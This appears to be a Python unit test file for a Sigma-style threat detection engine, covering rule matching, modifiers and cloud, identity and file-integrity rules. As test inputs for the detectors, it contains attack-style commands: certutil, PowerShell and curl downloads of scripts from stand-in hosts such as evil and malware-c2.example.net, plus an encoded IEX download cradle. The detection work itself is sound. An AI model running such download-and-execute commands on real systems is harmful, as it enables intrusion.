"""Unit tests for the Sigma-subset detection engine (no database needed)."""
from pathlib import Path

from app.detection.engine import (DetectionEngine, Rule, alert_from_match,
                                   flatten_event, load_rules, match_rule)
from app.models import NormalizedEvent

RULES_DIR = Path(__file__).resolve().parent.parent / "rules"


def _match(detection: dict, logsource: dict | None = None, **fields) -> bool:
    fields.setdefault("vendor", "v")
    rule = Rule(id="t", title="t", level="low", description="",
                logsource=logsource or {}, detection=detection)
    return match_rule(rule, flatten_event(NormalizedEvent(event_time=None, **fields)))


# ── value / selection matching ──────────────────────────────────────────────
def test_equals_and_contains():
    assert _match({"s": {"action": "deny"}, "condition": "s"}, action="deny")
    assert not _match({"s": {"action": "deny"}, "condition": "s"}, action="allow")
    assert _match({"s": {"message|contains": "failed"}, "condition": "s"},
                  message="Logon failed for user")


def test_value_list_is_or_and_all_modifier_is_and():
    d = {"s": {"action": ["allow", "accept"]}, "condition": "s"}
    assert _match(d, action="accept") and not _match(d, action="drop")
    allmode = {"s": {"message|contains|all": ["alpha", "beta"]}, "condition": "s"}
    assert _match(allmode, message="alpha and beta here")
    assert not _match(allmode, message="only alpha")


def test_wildcard_startswith_and_null():
    assert _match({"s": {"host_name": "FIN-*"}, "condition": "s"}, host_name="FIN-WS-014")
    assert not _match({"s": {"host_name": "FIN-*"}, "condition": "s"}, host_name="HR-1")
    assert _match({"s": {"user_name": None}, "condition": "s"})            # field absent


def test_keywords_search_all_fields():
    d = {"k": ["certutil", "bitsadmin"], "condition": "k"}
    assert _match(d, message="cmd /c certutil -urlcache -f http://x/y.exe")
    assert not _match(d, message="nothing to see")


# ── condition grammar ───────────────────────────────────────────────────────
def test_condition_and_not():
    d = {"a": {"action": "deny"}, "b": {"protocol": "tcp"}, "condition": "a and not b"}
    assert _match(d, action="deny", protocol="udp")
    assert not _match(d, action="deny", protocol="tcp")


def test_condition_one_of_and_all_of_wildcard():
    d = {"sel_x": {"action": "deny"}, "sel_y": {"action": "drop"}, "condition": "1 of sel_*"}
    assert _match(d, action="drop") and not _match(d, action="allow")
    d2 = {"sel_x": {"action": "deny"}, "sel_y": {"protocol": "tcp"}, "condition": "all of sel_*"}
    assert _match(d2, action="deny", protocol="tcp")
    assert not _match(d2, action="deny", protocol="udp")


def test_modifier_cidr():
    d = {"s": {"src_ip|cidr": ["10.0.0.0/8", "192.168.0.0/16"]}, "condition": "s"}
    assert _match(d, src_ip="10.1.2.3") and _match(d, src_ip="192.168.5.5")
    assert not _match(d, src_ip="203.0.113.9")
    assert not _match(d, src_ip="not-an-ip")


def test_modifier_numeric_comparisons():
    assert _match({"s": {"dst_port|gte": 1024}, "condition": "s"}, dst_port=3389)
    assert not _match({"s": {"dst_port|lt": 1024}, "condition": "s"}, dst_port=3389)
    assert _match({"s": {"bytes_total|gt": 1000000}, "condition": "s"}, bytes_total=5_000_000)


def test_modifier_exists_and_fieldref():
    assert _match({"s": {"user_name|exists": True}, "condition": "s"}, user_name="jdoe")
    assert _match({"s": {"host_name|exists": False}, "condition": "s"})       # absent
    assert not _match({"s": {"user_name|exists": True}, "condition": "s"})
    # fieldref: user_name equals the (raw) caller field
    d = {"s": {"user_name|fieldref": "caller"}, "condition": "s"}
    assert _match(d, user_name="svc-1", raw={"caller": "svc-1"})
    assert not _match(d, user_name="svc-1", raw={"caller": "other"})


def test_modifier_base64offset_and_windash():
    # 'IEX' embedded anywhere in a base64 blob is caught by base64offset|contains
    import base64
    blob = base64.b64encode(b"random IEX(New-Object Net.WebClient)").decode()
    assert _match({"s": {"message|base64offset|contains": "IEX"}, "condition": "s"},
                  message=blob)
    # windash: a rule written with -enc also matches the /enc form
    d = {"s": {"message|windash|contains": "-enc"}, "condition": "s"}
    assert _match(d, message="powershell -enc ABC") and _match(d, message="powershell /enc ABC")


def test_modifier_re_flags():
    # multiline + ignorecase via |re|m|i
    d = {"s": {"message|re|m|i": "^error"}, "condition": "s"}
    assert _match(d, message="line one\nERROR happened")


def test_logsource_filters_by_vendor_and_logtype():
    d = {"s": {"action": "failed-logon"}, "condition": "s"}
    ls = {"vendor": "microsoft", "log_type": "security"}
    assert _match(d, ls, vendor="microsoft", log_type="security", action="failed-logon")
    # wrong vendor -> no match even though the selection would hit
    assert not _match(d, ls, vendor="cisco", log_type="security", action="failed-logon")


# ── the shipped rule library ────────────────────────────────────────────────
def test_rules_load_with_mitre_tags():
    rules = load_rules(RULES_DIR)
    ids = {r.id for r in rules}
    assert {"lo-win-failed-logon", "lo-rdp-allowed", "lo-ingress-tool-transfer",
            "lo-clear-eventlog"} <= ids
    flog = next(r for r in rules if r.id == "lo-win-failed-logon")
    assert "T1110" in flog.techniques and "credential access" in flog.tactics


def test_engine_fires_expected_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-win-failed-logon" in hits(vendor="microsoft", log_type="security",
                                         action="failed-logon")
    rdp = hits(vendor="paloalto", dst_port=3389, action="allow")
    assert "lo-rdp-allowed" in rdp
    assert "lo-rdp-allowed" not in hits(vendor="paloalto", dst_port=3389, action="deny")
    assert "lo-ingress-tool-transfer" in hits(
        vendor="x", message="powershell Invoke-WebRequest http://evil/x.ps1")
    assert "lo-clear-eventlog" in hits(vendor="microsoft", raw={"EventID": 1102})


def test_rule_pack_loads_and_is_well_formed():
    rules = load_rules(RULES_DIR)
    by_id = {r.id for r in rules}
    expected = {"lo-aws-logging-disabled", "lo-aws-root-console-login",
                "lo-aws-sg-open-world", "lo-aws-access-key-created",
                "lo-entra-risky-signin", "lo-entra-legacy-auth",
                "lo-okta-admin-grant", "lo-okta-mfa-deactivated",
                "lo-m365-inbox-forwarding", "lo-github-repo-public",
                "lo-powershell-encoded", "lo-external-rdp-inbound"}
    assert expected <= by_id
    # every shipped detection rule has a level, a condition and parsed MITRE tags
    for r in rules:
        assert r.level in ("low", "medium", "high", "critical", "informational")
        assert r.detection.get("condition")
        assert r.techniques, f"{r.id} has no technique tag"


def test_engine_fires_cloud_and_identity_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-aws-logging-disabled" in hits(
        vendor="aws", product="cloudtrail", rule_name="StopLogging")
    assert "lo-aws-root-console-login" in hits(
        vendor="aws", product="cloudtrail", rule_name="ConsoleLogin",
        raw={"userIdentity": {"type": "Root"}})
    assert "lo-entra-risky-signin" in hits(
        vendor="microsoft", product="entra", log_type="signin",
        action="success", severity="high")
    assert "lo-entra-risky-signin" not in hits(
        vendor="microsoft", product="entra", log_type="signin",
        action="success", severity="low")
    assert "lo-m365-inbox-forwarding" in hits(
        vendor="microsoft", product="o365", action="New-InboxRule",
        message="Created rule with ForwardTo attacker@evil.test")
    assert "lo-okta-mfa-deactivated" in hits(
        vendor="okta", log_type="user.mfa.factor.deactivate")


def test_engine_fires_modifier_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    # cidr: public source fires, RFC1918 source does not
    assert "lo-external-rdp-inbound" in hits(
        vendor="paloalto", dst_port=3389, action="allow", src_ip="203.0.113.7")
    assert "lo-external-rdp-inbound" not in hits(
        vendor="paloalto", dst_port=3389, action="allow", src_ip="10.20.30.40")
    # windash: the /enc form of an encoded PowerShell command
    assert "lo-powershell-encoded" in hits(
        vendor="x", message="powershell.exe /enc SQBFAFgA")


def test_engine_fires_tripwire_fim_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def tw(resource=None, message=None, action=None, vendor="tripwire"):
        return dict(vendor=vendor, product="tripwire enterprise", log_type="fileintegrity",
                    action=action, message=message,
                    raw={"attributes": {"resource": resource} if resource else {}})

    # each FIM rule fires on its indicator (resource carried in raw.attributes)
    assert "lo-tripwire-critical-file-change" in hits(
        **tw(resource="/etc/shadow", message="Monitored file changed: /etc/shadow"))
    assert "lo-tripwire-web-shell" in hits(
        **tw(resource="/var/www/html/cmd.php", action="added"))
    assert "lo-tripwire-persistence-change" in hits(
        **tw(resource="/etc/cron.d/backdoor", action="added"))
    assert "lo-tripwire-monitoring-disabled" in hits(
        **tw(message="Real-time monitoring stopped for node FIN-WS-014", action="disabled"))
    assert "lo-tripwire-object-removed" in hits(
        **tw(resource="/var/log/audit/audit.log", message="object removed", action="removed"))

    # negatives: a benign monitored change fires nothing, and the vendor gate
    # keeps a non-Tripwire event with the same path from tripping these rules.
    assert not {i for i in hits(**tw(resource="/tmp/app.log", action="modified"))
                if "tripwire" in i}
    assert not {i for i in hits(vendor="cisco", message="changed /etc/shadow",
                                raw={"attributes": {"resource": "/etc/shadow"}})
                if "tripwire" in i}


def test_existing_rules_fire_on_endpoint_telemetry():
    """The new Sysmon / auditd parsers feed CommandLine into the fields existing
    command-line rules already match — so endpoint telemetry lights them up."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-powershell-encoded" in hits(          # Sysmon EID 1 process create
        vendor="microsoft", product="sysmon", log_type="process-create",
        action="process-create", message="powershell.exe -enc SQBFAFgA")
    assert "lo-ingress-tool-transfer" in hits(       # Linux auditd EXECVE
        vendor="linux", product="auditd", log_type="execve", action="process-create",
        message="curl -O http://malware-c2.example.net/x.sh")


def test_alert_from_match_builds_row():
    rule = next(r for r in load_rules(RULES_DIR) if r.id == "lo-win-failed-logon")
    evt = NormalizedEvent(event_time=None, vendor="microsoft", log_type="security",
                          action="failed-logon", user_name="CORP\\jdoe",
                          src_ip="45.83.122.7", message="x" * 5000)
    a = alert_from_match(rule, evt, dedup_hash="abc123", batch_id=7)
    assert a["rule_id"] == "lo-win-failed-logon" and a["level"] == "low"
    assert "T1110" in a["techniques"] and "credential access" in a["tactics"]
    assert a["src_ip"] == "45.83.122.7" and a["user_name"] == "CORP\\jdoe"
    assert a["dedup_hash"] == "abc123" and a["batch_id"] == 7
    assert len(a["message"]) == 1000          # truncated for storage
